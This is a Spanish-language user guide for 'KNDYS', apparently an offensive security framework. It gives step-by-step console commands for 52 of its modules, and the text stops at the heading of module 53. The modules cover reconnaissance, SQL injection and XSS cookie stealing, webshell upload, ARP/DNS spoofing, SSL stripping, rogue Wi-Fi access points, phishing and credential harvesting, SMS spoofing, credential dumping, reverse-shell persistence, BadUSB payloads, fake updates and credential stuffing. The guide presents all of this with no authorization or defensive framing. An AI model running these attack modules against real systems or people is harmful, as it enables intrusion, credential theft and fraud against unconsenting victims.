# KNDYS Framework - Guía Completa de Módulos

**Versión:** 3.2  
**Última Actualización:** Enero 2025  
**Propósito:** Guía paso a paso para utilizar todos los 53 módulos del framework KNDYS

---

## Tabla de Contenidos

1. [Inicio Rápido](#inicio-rápido)
2. [Módulos de Reconocimiento](#módulos-de-reconocimiento)
3. [Módulos de Escaneo de Vulnerabilidades](#módulos-de-escaneo-de-vulnerabilidades)
4. [Módulos de Explotación Web](#módulos-de-explotación-web)
5. [Módulos de Ataque de Red](#módulos-de-ataque-de-red)
6. [Módulos de Redes Inalámbricas](#módulos-de-redes-inalámbricas)
7. [Módulos de Ingeniería Social](#módulos-de-ingeniería-social)
8. [Módulos de Post-Explotación](#módulos-de-post-explotación)
9. [Módulos Utilitarios](#módulos-utilitarios)
10. [Preguntas Frecuentes](#preguntas-frecuentes)

---

## Inicio Rápido

### 1. Iniciar el Framework

```bash
./kndys.py
```

Se abrirá la consola interactiva de KNDYS. El prompt mostrará `kndys>`.

### 2. Ver Módulos Disponibles

```bash
kndys> show modules
```

Se mostrará la lista completa de los 53 módulos disponibles.

### 3. Seleccionar un Módulo

```bash
kndys> use <nombre_del_módulo>
```

Ejemplo:
```bash
kndys> use port_scanner
```

### 4. Ver Opciones del Módulo

```bash
kndys(port_scanner)> show options
```

Se mostrarán los parámetros que el módulo necesita.

### 5. Configurar Parámetros

```bash
kndys(port_scanner)> set <parámetro> <valor>
```

Ejemplo:
```bash
kndys(port_scanner)> set target 192.168.1.1
kndys(port_scanner)> set ports 1-1000
```

### 6. Ejecutar el Módulo

```bash
kndys(port_scanner)> run
```

El módulo comenzará a ejecutarse y mostrará los resultados.

---

## Módulos de Reconocimiento

### 1. Port Scanner (Escáner de Puertos)

**Descripción:** Identifica puertos abiertos y servicios en una máquina objetivo.

**Cómo usar:**
```bash
kndys> use port_scanner
kndys(port_scanner)> set target 192.168.1.100
kndys(port_scanner)> set ports 1-65535          # Escanea todos los puertos
kndys(port_scanner)> set threads 50              # Aumenta velocidad con más threads
kndys(port_scanner)> run
```

**Parámetros principales:**
- `target`: Dirección IP o hostname objetivo
- `ports`: Rango de puertos (ej: 80,443,8080 o 1-1000)
- `threads`: Cantidad de threads paralelos (1-100)

**Resultado:** Lista de puertos abiertos con servicios detectados.

---

### 2. Subdomain Scanner (Escáner de Subdominios)

**Descripción:** Descubre subdominios asociados a un dominio objetivo.

**Cómo usar:**
```bash
kndys> use subdomain_scanner
kndys(subdomain_scanner)> set target example.com
kndys(subdomain_scanner)> set wordlist medium       # Tamaño del diccionario
kndys(subdomain_scanner)> run
```

**Parámetros principales:**
- `target`: Dominio objetivo
- `wordlist`: small, medium, large
- `threads`: Threads paralelos

**Resultado:** Lista de subdominios encontrados con sus direcciones IP.

---

### 3. Network Mapper (Mapeador de Red)

**Descripción:** Mapea la red y descubre dispositivos conectados.

**Cómo usar:**
```bash
kndys> use network_mapper
kndys(network_mapper)> set target 192.168.1.0/24
kndys(network_mapper)> set method ping             # ping, arp, tcp
kndys(network_mapper)> run
```

**Parámetros principales:**
- `target`: Rango de red (CIDR notation)
- `method`: ping, arp, tcp
- `threads`: Threads paralelos

**Resultado:** Mapa de dispositivos activos en la red.

---

### 4. OS Detection (Detección del Sistema Operativo)

**Descripción:** Identifica el sistema operativo de un host remoto.

**Cómo usar:**
```bash
kndys> use os_detection
kndys(os_detection)> set target 192.168.1.100
kndys(os_detection)> set method ttl                # ttl, banner, http
kndys(os_detection)> run
```

**Parámetros principales:**
- `target`: Host objetivo
- `method`: ttl, banner, http
- `ports`: Puertos a escanear

**Resultado:** Sistema operativo y versión estimados.

---

### 5. Web Crawler (Rastreador Web)

**Descripción:** Rastrea un sitio web para descubrir todas las páginas, formularios y enlaces.

**Cómo usar:**
```bash
kndys> use web_crawler
kndys(web_crawler)> set target http://example.com
kndys(web_crawler)> set depth 2                    # Profundidad de rastreo
kndys(web_crawler)> set threads 10
kndys(web_crawler)> run
```

**Parámetros principales:**
- `target`: URL base
- `depth`: Profundidad de rastreo (1-5)
- `follow_redirects`: true/false
- `threads`: Threads paralelos

**Resultado:** Mapa completo del sitio con URLs, formularios y parámetros.

---

## Módulos de Escaneo de Vulnerabilidades

### 6. SQL Scanner (Escáner de Inyección SQL)

**Descripción:** Detecta vulnerabilidades de inyección SQL en aplicaciones web.

**Cómo usar:**
```bash
kndys> use sql_scanner
kndys(sql_scanner)> set target http://example.com/page?id=1
kndys(sql_scanner)> set method error              # error, blind, time, union
kndys(sql_scanner)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `method`: Tipo de inyección
- `parameter`: Parámetro específico a probar
- `threads`: Threads paralelos

**Resultado:** Detalles de vulnerabilidad SQL encontrada.

---

### 7. XSS Scanner (Escáner de Cross-Site Scripting)

**Descripción:** Identifica vulnerabilidades XSS (Cross-Site Scripting) en aplicaciones web.

**Cómo usar:**
```bash
kndys> use xss_scanner
kndys(xss_scanner)> set target http://example.com
kndys(xss_scanner)> set type reflected              # reflected, stored, dom
kndys(xss_scanner)> run
```

**Parámetros principales:**
- `target`: URL objetivo
- `type`: Tipo de XSS a buscar
- `payloads`: Cantidad de payloads a probar

**Resultado:** Puntos XSS vulnerables encontrados.

---

### 8. SSL/TLS Scanner (Escáner SSL/TLS)

**Descripción:** Analiza la configuración SSL/TLS de un servidor web.

**Cómo usar:**
```bash
kndys> use ssl_scanner
kndys(ssl_scanner)> set target example.com:443
kndys(ssl_scanner)> run
```

**Parámetros principales:**
- `target`: Servidor objetivo
- `port`: Puerto SSL (por defecto 443)

**Resultado:** Información de certificado, protocolos soportados, vulnerabilidades.

---

### 9. Vulnerability Scanner (Escáner General de Vulnerabilidades)

**Descripción:** Escaneo completo de vulnerabilidades comunes en aplicaciones web.

**Cómo usar:**
```bash
kndys> use vuln_scanner
kndys(vuln_scanner)> set target http://example.com
kndys(vuln_scanner)> set scan_type full            # quick, standard, full
kndys(vuln_scanner)> run
```

**Parámetros principales:**
- `target`: URL objetivo
- `scan_type`: quick, standard, full
- `threads`: Threads paralelos

**Resultado:** Reporte completo de vulnerabilidades encontradas.

---

### 10. CSRF Scanner (Escáner de Falsificación de Solicitud entre Sitios)

**Descripción:** Detecta vulnerabilidades CSRF en formularios web.

**Cómo usar:**
```bash
kndys> use csrf_scanner
kndys(csrf_scanner)> set target http://example.com/forms/post
kndys(csrf_scanner)> run
```

**Parámetros principales:**
- `target`: URL con formulario
- `method`: POST, GET, PUT, DELETE

**Resultado:** Análisis CSRF con recomendaciones de mitigación.

---

## Módulos de Explotación Web

### 11. SQL Injection Exploit (Explotación de Inyección SQL)

**Descripción:** Explota vulnerabilidades SQL para extraer información de la base de datos.

**Cómo usar:**
```bash
kndys> use sql_injection
kndys(sql_injection)> set target http://example.com/page?id=1
kndys(sql_injection)> set database mysql           # mysql, mssql, postgresql
kndys(sql_injection)> set action extract_data      # extract_data, execute_query
kndys(sql_injection)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `database`: Tipo de base de datos
- `action`: extract_data, execute_query
- `query`: Consulta SQL personalizada

**Resultado:** Datos extraídos de la base de datos.

---

### 12. XSS Exploit (Explotación de XSS)

**Descripción:** Ejecuta ataques XSS para robar cookies, sesiones o redireccionar usuarios.

**Cómo usar:**
```bash
kndys> use xss_exploit
kndys(xss_exploit)> set target http://example.com/search?q=test
kndys(xss_exploit)> set payload cookie_stealer     # cookie_stealer, redirect, keylogger
kndys(xss_exploit)> set listener_ip 192.168.1.100
kndys(xss_exploit)> set listener_port 8000
kndys(xss_exploit)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `payload`: Tipo de payload
- `listener_ip`: IP para recibir datos
- `listener_port`: Puerto del listener

**Resultado:** Servidor escuchando para datos robados.

---

### 13. Command Injection (Inyección de Comandos)

**Descripción:** Ejecuta comandos del sistema mediante inyección de comandos.

**Cómo usar:**
```bash
kndys> use command_injection
kndys(command_injection)> set target http://example.com/ping?host=127.0.0.1
kndys(command_injection)> set command id           # Comando del sistema a ejecutar
kndys(command_injection)> set separator ";"         # Separador de comandos
kndys(command_injection)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `command`: Comando a ejecutar
- `parameter`: Parámetro vulnerable
- `separator`: Separador de comandos (;, |, &)

**Resultado:** Salida del comando ejecutado.

---

### 14. Directory Traversal (Traversal de Directorios)

**Descripción:** Accede a archivos fuera del directorio raíz mediante traversal.

**Cómo usar:**
```bash
kndys> use dir_traversal
kndys(dir_traversal)> set target http://example.com/file?path=index.html
kndys(dir_traversal)> set files /etc/passwd,/etc/shadow,windows/win.ini
kndys(dir_traversal)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `files`: Archivos a intentar acceder
- `depth`: Profundidad de traversal (../)

**Resultado:** Contenido de archivos accedidos.

---

### 15. File Upload Exploit (Explotación de Carga de Archivos)

**Descripción:** Sube archivos maliciosos para obtener acceso al servidor.

**Cómo usar:**
```bash
kndys> use file_upload
kndys(file_upload)> set target http://example.com/upload
kndys(file_upload)> set payload webshell           # webshell, reverse_shell, backdoor
kndys(file_upload)> set file_type php              # php, jsp, aspx, shell
kndys(file_upload)> set bypass_method null_byte    # null_byte, double_extension, magic_bytes
kndys(file_upload)> run
```

**Parámetros principales:**
- `target`: URL de carga
- `payload`: Tipo de payload
- `file_type`: Tipo de archivo
- `bypass_method`: Método de evasión

**Resultado:** URL del archivo subido o acceso shell.

---

## Módulos de Ataque de Red

### 16. ARP Spoofing (Suplantación ARP)

**Descripción:** Realiza ataques ARP spoofing para interceptar tráfico de red.

**Cómo usar:**
```bash
kndys> use arp_spoof
kndys(arp_spoof)> set target_ip 192.168.1.100
kndys(arp_spoof)> set gateway_ip 192.168.1.1
kndys(arp_spoof)> set interface eth0               # Interfaz de red
kndys(arp_spoof)> run
```

**Parámetros principales:**
- `target_ip`: IP a suplantar
- `gateway_ip`: IP del gateway
- `interface`: Interfaz de red
- `duration`: Duración del ataque

**Resultado:** Tráfico redirigido a tu máquina.

---

### 17. DNS Spoofing (Suplantación DNS)

**Descripción:** Redirige consultas DNS a un servidor malicioso.

**Cómo usar:**
```bash
kndys> use dns_spoof
kndys(dns_spoof)> set target_domain example.com
kndys(dns_spoof)> set redirect_ip 192.168.1.100
kndys(dns_spoof)> set interface eth0
kndys(dns_spoof)> run
```

**Parámetros principales:**
- `target_domain`: Dominio a suplantar
- `redirect_ip`: IP a redirigir
- `interface`: Interfaz de red

**Resultado:** Consultas DNS redirigidas.

---

### 18. Packet Sniffer (Olfateo de Paquetes)

**Descripción:** Captura y analiza tráfico de red en la red local.

**Cómo usar:**
```bash
kndys> use packet_sniffer
kndys(packet_sniffer)> set interface eth0
kndys(packet_sniffer)> set filter http             # http, dns, ftp, ssh, all
kndys(packet_sniffer)> set packet_count 100
kndys(packet_sniffer)> run
```

**Parámetros principales:**
- `interface`: Interfaz de red
- `filter`: Filtro de tráfico
- `packet_count`: Número de paquetes a capturar
- `output_file`: Guardar en archivo

**Resultado:** Paquetes capturados con análisis.

---

### 19. SSL Strip (Ataque SSL Strip)

**Descripción:** Degrada conexiones HTTPS a HTTP para interceptar tráfico.

**Cómo usar:**
```bash
kndys> use ssl_strip
kndys(ssl_strip)> set target_ip 192.168.1.100
kndys(ssl_strip)> set interface eth0
kndys(ssl_strip)> set ssl_port 8443
kndys(ssl_strip)> run
```

**Parámetros principales:**
- `target_ip`: IP objetivo
- `interface`: Interfaz de red
- `ssl_port`: Puerto para SSL
- `redirect_port`: Puerto de redirección

**Resultado:** Tráfico HTTPS degradado a HTTP.

---

### 20. DHCP Starvation (Inanición DHCP)

**Descripción:** Realiza ataque de inanición DHCP para denegar asignación de IPs.

**Cómo usar:**
```bash
kndys> use dhcp_starvation
kndys(dhcp_starvation)> set interface eth0
kndys(dhcp_starvation)> set target_network 192.168.1.0/24
kndys(dhcp_starvation)> run
```

**Parámetros principales:**
- `interface`: Interfaz de red
- `target_network`: Red objetivo
- `duration`: Duración del ataque

**Resultado:** Agotamiento del pool DHCP.

---

## Módulos de Redes Inalámbricas

### 21. WiFi Scanner (Escáner WiFi)

**Descripción:** Descubre redes WiFi disponibles y obtiene información sobre ellas.

**Cómo usar:**
```bash
kndys> use wifi_scanner
kndys(wifi_scanner)> set interface wlan0
kndys(wifi_scanner)> set scan_time 10              # Segundos de escaneo
kndys(wifi_scanner)> run
```

**Parámetros principales:**
- `interface`: Interfaz WiFi
- `scan_time`: Tiempo de escaneo
- `filter_ssid`: Filtrar por SSID

**Resultado:** Lista de redes WiFi con BSSID, canal, potencia, seguridad.

---

### 22. WiFi Cracker (Cracker WiFi)

**Descripción:** Realiza ataque de fuerza bruta contra contraseñas WiFi.

**Cómo usar:**
```bash
kndys> use wifi_cracker
kndys(wifi_cracker)> set target_bssid 00:11:22:33:44:55
kndys(wifi_cracker)> set target_ssid "MyNetwork"
kndys(wifi_cracker)> set wordlist rockyou.txt     # Archivo de diccionario
kndys(wifi_cracker)> set interface wlan0
kndys(wifi_cracker)> run
```

**Parámetros principales:**
- `target_bssid`: BSSID de la red
- `target_ssid`: SSID de la red
- `wordlist`: Archivo de diccionario
- `interface`: Interfaz WiFi

**Resultado:** Contraseña encontrada o acceso denegado.

---

### 23. Rogue AP (Punto de Acceso Falso)

**Descripción:** Crea un punto de acceso WiFi falso para realizar ataques MITM.

**Cómo usar:**
```bash
kndys> use rogue_ap
kndys(rogue_ap)> set interface wlan0
kndys(rogue_ap)> set ssid "Starbucks_WiFi"       # Nombre de red falsa
kndys(rogue_ap)> set channel 6
kndys(rogue_ap)> set mode mitm                    # mitm, phishing, denial
kndys(rogue_ap)> run
```

**Parámetros principales:**
- `interface`: Interfaz WiFi
- `ssid`: Nombre de la red falsa
- `channel`: Canal WiFi
- `mode`: mitm, phishing, denial
- `hostapd_conf`: Archivo de configuración personalizado

**Resultado:** Punto de acceso WiFi falso activo.

---

## Módulos de Ingeniería Social

### 24. Phishing (Ataque de Phishing)

**Descripción:** Crea campañas de phishing para capturar credenciales.

**Cómo usar:**
```bash
kndys> use phishing
kndys(phishing)> set target_email user@example.com
kndys(phishing)> set template paypal               # paypal, gmail, amazon, microsoft, custom
kndys(phishing)> set listener_ip 192.168.1.100
kndys(phishing)> set listener_port 8000
kndys(phishing)> run
```

**Parámetros principales:**
- `target_email`: Email objetivo
- `template`: Template de phishing
- `listener_ip`: IP del servidor
- `listener_port`: Puerto del servidor
- `smtp_server`: Servidor SMTP

**Resultado:** Servidor phishing activo esperando respuestas.

---

### 25. Credential Harvester (Recolector de Credenciales)

**Descripción:** Crea páginas falsas para capturar credenciales de usuario.

**Cómo usar:**
```bash
kndys> use credential_harvester
kndys(credential_harvester)> set template facebook  # facebook, gmail, twitter, linkedin, custom
kndys(credential_harvester)> set listener_ip 192.168.1.100
kndys(credential_harvester)> set listener_port 8000
kndys(credential_harvester)> run
```

**Parámetros principales:**
- `template`: Página falsa a simular
- `listener_ip`: IP del servidor
- `listener_port`: Puerto
- `custom_html`: HTML personalizado

**Resultado:** Página de captura activa con credenciales registradas.

---

### 26. Website Cloner (Clonador de Sitios Web)

**Descripción:** Clona un sitio web para crear versión falsa.

**Cómo usar:**
```bash
kndys> use website_cloner
kndys(website_cloner)> set target http://example.com
kndys(website_cloner)> set output_dir cloned_site
kndys(website_cloner)> set modify_links true      # Modificar enlaces para phishing
kndys(website_cloner)> run
```

**Parámetros principales:**
- `target`: URL a clonar
- `output_dir`: Directorio de salida
- `modify_links`: Modificar enlaces
- `depth`: Profundidad de clonado

**Resultado:** Copia completa del sitio web.

---

### 27. SMS Spoofing (Suplantación SMS)

**Descripción:** Envía SMS falsos desde números diferentes (requiere credenciales especiales).

**Cómo usar:**
```bash
kndys> use sms_spoofing
kndys(sms_spoofing)> set target_number "+1234567890"
kndys(sms_spoofing)> set sender_name "BankAlert"  # Remitente a mostrar
kndys(sms_spoofing)> set message "Verify your account"
kndys(sms_spoofing)> set gateway twilio            # twilio, nexmo, custom
kndys(sms_spoofing)> run
```

**Parámetros principales:**
- `target_number`: Número a atacar
- `sender_name`: Nombre del remitente
- `message`: Mensaje a enviar
- `gateway`: Servicio de SMS

**Resultado:** SMS enviado desde número falsificado.

---

### 28. Pretexting (Pretexting)

**Descripción:** Herramienta para crear pretextos creíbles en ataques de ingeniería social.

**Cómo usar:**
```bash
kndys> use pretexting
kndys(pretexting)> set target_name "John Smith"
kndys(pretexting)> set pretext_type tech_support   # tech_support, delivery, survey, custom
kndys(pretexting)> set generate_script true
kndys(pretexting)> run
```

**Parámetros principales:**
- `target_name`: Nombre del objetivo
- `pretext_type`: Tipo de pretexto
- `generate_script`: Generar script de llamada

**Resultado:** Script y estrategia de pretexting generados.

---

### 29. Mass Mailer (Envío Masivo de Correos)

**Descripción:** Envía correos masivos para campañas de phishing o spam.

**Cómo usar:**
```bash
kndys> use mass_mailer
kndys(mass_mailer)> set email_list targets.txt   # Archivo con emails
kndys(mass_mailer)> set subject "Account Verification"
kndys(mass_mailer)> set body email_body.txt
kndys(mass_mailer)> set smtp_server smtp.gmail.com
kndys(mass_mailer)> set smtp_port 587
kndys(mass_mailer)> set sender_email attacker@gmail.com
kndys(mass_mailer)> run
```

**Parámetros principales:**
- `email_list`: Archivo con lista de emails
- `subject`: Asunto del correo
- `body`: Cuerpo del correo
- `smtp_server`: Servidor SMTP
- `attachment`: Archivo adjunto

**Resultado:** Correos enviados a todos los objetivos.

---

## Módulos de Post-Explotación

### 30. Credential Dumper (Extractor de Credenciales)

**Descripción:** Extrae credenciales almacenadas del sistema comprometido.

**Cómo usar:**
```bash
kndys> use credential_dumper
kndys(credential_dumper)> set target_host 192.168.1.100
kndys(credential_dumper)> set username admin
kndys(credential_dumper)> set password P@ssw0rd
kndys(credential_dumper)> set method ntlm           # ntlm, kerberos, lsa, mimikatz
kndys(credential_dumper)> run
```

**Parámetros principales:**
- `target_host`: Host comprometido
- `username`: Usuario con privilegios
- `password`: Contraseña
- `method`: Método de extracción
- `output_file`: Guardar credenciales

**Resultado:** Credenciales extraídas del sistema.

---

### 31. Privilege Escalation (Escalada de Privilegios)

**Descripción:** Escala privilegios en el sistema comprometido.

**Cómo usar:**
```bash
kndys> use privilege_escalation
kndys(privilege_escalation)> set target_host 192.168.1.100
kndys(privilege_escalation)> set username lowpriv_user
kndys(privilege_escalation)> set method sudo        # sudo, suid, kernel_exploit, token_impersonation
kndys(privilege_escalation)> run
```

**Parámetros principales:**
- `target_host`: Host objetivo
- `username`: Usuario actual
- `method`: Método de escalada
- `exploit`: Exploit específico

**Resultado:** Acceso con privilegios elevados.

---

### 32. Persistence (Mecanismo de Persistencia)

**Descripción:** Establece mecanismos para mantener acceso al sistema comprometido.

**Cómo usar:**
```bash
kndys> use persistence
kndys(persistence)> set target_host 192.168.1.100
kndys(persistence)> set method reverse_shell       # reverse_shell, cron_job, systemd, registry, startup_folder
kndys(persistence)> set listener_ip 192.168.1.50
kndys(persistence)> set listener_port 4444
kndys(persistence)> run
```

**Parámetros principales:**
- `target_host`: Host objetivo
- `method`: Método de persistencia
- `listener_ip`: IP para conexiones
- `listener_port`: Puerto para conexiones

**Resultado:** Mecanismo de persistencia instalado.

---

### 33. Pivot (Pivoteo de Red)

**Descripción:** Usa el sistema comprometido para pivotar a otras máquinas en la red.

**Cómo usar:**
```bash
kndys> use pivot
kndys(pivot)> set compromised_host 192.168.1.100
kndys(pivot)> set target_network 192.168.2.0/24
kndys(pivot)> set pivot_method proxy               # proxy, tunnel, socks
kndys(pivot)> run
```

**Parámetros principales:**
- `compromised_host`: Host comprometido (puente)
- `target_network`: Red a atacar
- `pivot_method`: Método de pivoteo
- `listener_port`: Puerto local

**Resultado:** Túnel de pivoteo establecido.

---

## Módulos Utilitarios

### 34. Hash Cracker (Cracker de Hashes)

**Descripción:** Realiza ataques de fuerza bruta contra hashes (MD5, SHA1, SHA256, etc).

**Cómo usar:**
```bash
kndys> use hash_cracker
kndys(hash_cracker)> set hash_value "5f4dcc3b5aa765d61d8327deb882cf99"
kndys(hash_cracker)> set hash_type md5             # md5, sha1, sha256, ntlm, bcrypt
kndys(hash_cracker)> set wordlist rockyou.txt
kndys(hash_cracker)> run
```

**Parámetros principales:**
- `hash_value`: Hash a crackear
- `hash_type`: Tipo de hash
- `wordlist`: Archivo de diccionario
- `rules`: Reglas de transformación

**Resultado:** Contraseña encontrada o falla.

---

### 35. Brute Force (Ataque de Fuerza Bruta)

**Descripción:** Realiza ataques de fuerza bruta contra servicios (SSH, FTP, HTTP, etc).

**Cómo usar:**
```bash
kndys> use brute_force
kndys(brute_force)> set target 192.168.1.100:22
kndys(brute_force)> set service ssh                # ssh, ftp, http, smtp, rdp
kndys(brute_force)> set usernames users.txt
kndys(brute_force)> set passwords passwords.txt
kndys(brute_force)> set threads 10
kndys(brute_force)> run
```

**Parámetros principales:**
- `target`: Host:puerto objetivo
- `service`: Tipo de servicio
- `usernames`: Archivo de usuarios
- `passwords`: Archivo de contraseñas
- `threads`: Threads paralelos

**Resultado:** Credenciales válidas encontradas.

---

### 36. JWT Cracker (Cracker de JWT)

**Descripción:** Realiza ataques contra tokens JWT.

**Cómo usar:**
```bash
kndys> use jwt_cracker
kndys(jwt_cracker)> set token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
kndys(jwt_cracker)> set wordlist jwt_secrets.txt
kndys(jwt_cracker)> run
```

**Parámetros principales:**
- `token`: Token JWT a analizar
- `wordlist`: Archivo de secretos a probar
- `algorithm`: Algoritmo a forzar

**Resultado:** Secreto encontrado o análisis del JWT.

---

### 37. API Fuzzer (Fuzzer de API)

**Descripción:** Realiza fuzzing de endpoints API para encontrar vulnerabilidades.

**Cómo usar:**
```bash
kndys> use api_fuzzer
kndys(api_fuzzer)> set target http://api.example.com
kndys(api_fuzzer)> set payloads common_payloads.txt
kndys(api_fuzzer)> set method get                  # get, post, put, delete
kndys(api_fuzzer)> set threads 10
kndys(api_fuzzer)> run
```

**Parámetros principales:**
- `target`: API base URL
- `payloads`: Archivo de payloads
- `method`: Método HTTP
- `filter_codes`: Códigos a ignorar (400,404)

**Resultado:** Respuestas anómalas y vulnerabilidades encontradas.

---

### 38. CORS Scanner (Escáner CORS)

**Descripción:** Detecta configuraciones CORS mal configuradas.

**Cómo usar:**
```bash
kndys> use cors_scanner
kndys(cors_scanner)> set target http://example.com
kndys(cors_scanner)> set origins custom_origins.txt
kndys(cors_scanner)> run
```

**Parámetros principales:**
- `target`: URL objetivo
- `origins`: Archivo de orígenes a probar
- `methods`: Métodos HTTP a probar

**Resultado:** Configuraciones CORS vulnerables.

---

### 39. NoSQL Injection (Inyección NoSQL)

**Descripción:** Detecta y explota vulnerabilidades de inyección NoSQL.

**Cómo usar:**
```bash
kndys> use nosql_injection
kndys(nosql_injection)> set target http://example.com/search?name=user
kndys(nosql_injection)> set database mongodb       # mongodb, couchdb, elasticsearch
kndys(nosql_injection)> run
```

**Parámetros principales:**
- `target`: URL vulnerable
- `database`: Tipo de base de datos NoSQL
- `parameter`: Parámetro objetivo
- `payloads`: Payloads personalizados

**Resultado:** Acceso a base de datos NoSQL.

---

### 40. GraphQL Introspection (Introspección GraphQL)

**Descripción:** Realiza introspección de esquemas GraphQL para descubrir la API.

**Cómo usar:**
```bash
kndys> use graphql_introspection
kndys(graphql_introspection)> set target http://api.example.com/graphql
kndys(graphql_introspection)> run
```

**Parámetros principales:**
- `target`: Endpoint GraphQL
- `output_file`: Guardar esquema

**Resultado:** Esquema GraphQL completo descubierto.

---

### 41. QR Code Generator (Generador de Códigos QR)

**Descripción:** Genera códigos QR maliciosos para ataques de phishing.

**Cómo usar:**
```bash
kndys> use qr_generator
kndys(qr_generator)> set data "http://malicious-site.com"
kndys(qr_generator)> set output_file malicious_qr.png
kndys(qr_generator)> run
```

**Parámetros principales:**
- `data`: Datos/URL en el QR
- `output_file`: Guardar imagen
- `size`: Tamaño del QR

**Resultado:** Archivo PNG con QR generado.

---

### 42. USB Payload (Payload USB)

**Descripción:** Crea payloads USB para ataques de BadUSB o HID.

**Cómo usar:**
```bash
kndys> use usb_payload
kndys(usb_payload)> set payload_type reverse_shell  # reverse_shell, keylogger, download_execute
kndys(usb_payload)> set listener_ip 192.168.1.100
kndys(usb_payload)> set output_file payload.bin
kndys(usb_payload)> run
```

**Parámetros principales:**
- `payload_type`: Tipo de payload
- `listener_ip`: IP para conexiones
- `listener_port`: Puerto
- `output_file`: Guardar payload

**Resultado:** Payload USB generado.

---

### 43. Fake Update (Actualización Falsa)

**Descripción:** Crea pantallas falsas de actualización del sistema.

**Cómo usar:**
```bash
kndys> use fake_update
kndys(fake_update)> set target_os windows          # windows, macos, linux
kndys(fake_update)> set payload reverse_shell
kndys(fake_update)> set listener_ip 192.168.1.100
kndys(fake_update)> run
```

**Parámetros principales:**
- `target_os`: Sistema operativo
- `payload`: Tipo de payload
- `listener_ip`: IP para conexiones

**Resultado:** Ejecutable de actualización falsa generado.

---

### 44. Report Generator (Generador de Reportes)

**Descripción:** Genera reportes profesionales de los hallazgos de seguridad.

**Cómo usar:**
```bash
kndys> use report_generator
kndys(report_generator)> set scan_file results.json
kndys(report_generator)> set format html           # html, pdf, docx
kndys(report_generator)> set output_file report.html
kndys(report_generator)> set client_name "Acme Corp"
kndys(report_generator)> run
```

**Parámetros principales:**
- `scan_file`: Archivo de resultados
- `format`: Formato del reporte
- `output_file`: Archivo de salida
- `client_name`: Nombre del cliente
- `severity_filter`: Filtrar por severidad

**Resultado:** Reporte profesional generado.

---

### 45. Shell (Intérprete de Comandos)

**Descripción:** Proporciona un shell interactivo para ejecutar comandos manualmente.

**Cómo usar:**
```bash
kndys> use shell
kndys(shell)> whoami
root
kndys(shell)> ifconfig
eth0: flags=69<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST>
kndys(shell)> exit
```

**Funcionalidad:**
- Ejecutar cualquier comando del sistema
- Navegar directorios
- Gestionar archivos
- Herramientas de red

---

### 46. File Explorer (Explorador de Archivos)

**Descripción:** Navega y gestiona archivos en el sistema o remoto.

**Cómo usar:**
```bash
kndys> use file_explorer
kndys(file_explorer)> set target_host 192.168.1.100
kndys(file_explorer)> set path /home
kndys(file_explorer)> set action list             # list, upload, download, delete
kndys(file_explorer)> run
```

**Parámetros principales:**
- `target_host`: Host a explorar
- `path`: Ruta a explorar
- `action`: list, upload, download, delete, search

**Resultado:** Contenido del directorio o archivo transferido.

---

### 47. Evidence Collector (Recolector de Evidencia)

**Descripción:** Recolecta evidencia forense del sistema para análisis posterior.

**Cómo usar:**
```bash
kndys> use evidence_collector
kndys(evidence_collector)> set target_host 192.168.1.100
kndys(evidence_collector)> set collection_type full # full, network, file_system, logs
kndys(evidence_collector)> set output_dir evidence/
kndys(evidence_collector)> run
```

**Parámetros principales:**
- `target_host`: Host a analizar
- `collection_type`: Tipo de recolección
- `output_dir`: Directorio de salida
- `filters`: Filtros personalizados

**Resultado:** Evidencia recolectada en directorio de salida.

---

### 48. Multi-Handler (Manejador Múltiple)

**Descripción:** Maneja múltiples sesiones de shells reversos simultáneamente.

**Cómo usar:**
```bash
kndys> use multi_handler
kndys(multi_handler)> set listener_ip 0.0.0.0
kndys(multi_handler)> set listener_port 4444
kndys(multi_handler)> set max_sessions 5         # Máximo de sesiones simultáneas
kndys(multi_handler)> run
```

**Parámetros principales:**
- `listener_ip`: IP de escucha
- `listener_port`: Puerto de escucha
- `max_sessions`: Máximo de sesiones

**Resultado:** Listener activo para múltiples conexiones.

---

### 49. Spray Attack (Ataque Spray)

**Descripción:** Realiza ataques de spray contra contraseñas débiles comunes.

**Cómo usar:**
```bash
kndys> use spray_attack
kndys(spray_attack)> set target_list users.txt
kndys(spray_attack)> set password_list common_passwords.txt
kndys(spray_attack)> set service http              # http, ldap, smtp, ssh
kndys(spray_attack)> set delay 30                 # Segundos entre intentos
kndys(spray_attack)> run
```

**Parámetros principales:**
- `target_list`: Archivo con objetivos
- `password_list`: Archivo con contraseñas
- `service`: Tipo de servicio
- `delay`: Retraso entre intentos

**Resultado:** Credenciales válidas encontradas.

---

### 50. Buffer Overflow (Desbordamiento de Buffer)

**Descripción:** Herramienta para crear y testear exploits de buffer overflow.

**Cómo usar:**
```bash
kndys> use buffer_overflow
kndys(buffer_overflow)> set target_app vulnerable_app
kndys(buffer_overflow)> set buffer_size 256
kndys(buffer_overflow)> set payload reverse_shell
kndys(buffer_overflow)> set offset 260
kndys(buffer_overflow)> run
```

**Parámetros principales:**
- `target_app`: Aplicación vulnerable
- `buffer_size`: Tamaño del buffer
- `payload`: Payload a ejecutar
- `offset`: Offset al RIP/EIP

**Resultado:** Exploit generado o código ejecutado.

---

### 51. Credential Stuffing (Relleno de Credenciales)

**Descripción:** Realiza ataques de credential stuffing contra servicios web.

**Cómo usar:**
```bash
kndys> use credential_stuffing
kndys(credential_stuffing)> set target http://example.com/login
kndys(credential_stuffing)> set credentials leaked_accounts.txt
kndys(credential_stuffing)> set threads 10
kndys(credential_stuffing)> set proxy http://127.0.0.1:8080
kndys(credential_stuffing)> run
```

**Parámetros principales:**
- `target`: URL de login
- `credentials`: Archivo de credenciales
- `threads`: Threads paralelos
- `proxy`: Proxy para usar
- `user_agent_file`: Archivo con User-Agents

**Resultado:** Cuentas válidas encontradas.

---

### 52. Module Manager (Gestor de Módulos)

**Descripción:** Gestiona, actualiza e instala módulos adicionales.

**Cómo usar:**
```bash
kndys> use module
kndys(module)> show available              # Ver módulos disponibles
kndys(module)> install new_module
kndys(module)> update all
kndys(module)> list
```

**Funcionalidades:**
- `show available`: Listar módulos disponibles
- `install <nombre>`: Instalar módulo
- `update <nombre>`: Actualizar módulo
- `list`: Listar módulos instalados
- `remove <nombre>`: Eliminar módulo

---

### 53. Module Loader (Cargador de Módulos)

